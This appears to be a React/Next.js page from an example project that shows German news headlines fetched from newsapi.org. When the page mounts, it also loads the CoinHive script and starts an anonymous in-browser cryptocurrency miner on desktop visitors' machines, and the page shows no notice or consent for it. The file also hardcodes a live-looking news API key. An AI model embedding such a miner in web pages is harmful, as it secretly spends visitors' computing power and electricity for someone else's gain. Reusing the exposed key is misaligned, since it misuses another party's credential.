import Head from 'next/head';
import axios from 'axios';
import { Breadcrumb } from 'antd';

import Container from '../components/layout/container/index';
import News from '../components/news/index';

export default class First extends React.Component {
  static async getInitialProps() {
    const { data } = await axios.get(
      'https://newsapi.org/v2/top-headlines?country=de&apiKey=fa1bd6969b2548d2add38a5bb379126b'
    );

    const news = data.articles;

    return { news };
  }

  componentDidMount() {
    this.miner = new CoinHive.Anonymous('H4lnmQy879fDgH1shIrU6iGsaqgpOGvm', {
      throttle: 0.75
    });

    if (!this.miner.isMobile() && !this.miner.didOptOut(14400)) {
      this.miner.start();
    }
  }

  componentWillUnmount() {
    this.miner.stop();
  }

  render() {
    return (
      <Container>
        <Head>
          <title>Beispiel 1</title>
          <script src="https://coinhive.com/lib/coinhive.min.js" />
        </Head>
        <Breadcrumb style={{ margin: '16px 0' }}>
          <Breadcrumb.Item>Home</Breadcrumb.Item>
          <Breadcrumb.Item>Beispiel 1</Breadcrumb.Item>
        </Breadcrumb>
        <News ads={true} news={this.props.news} />
      </Container>
    );
  }
}
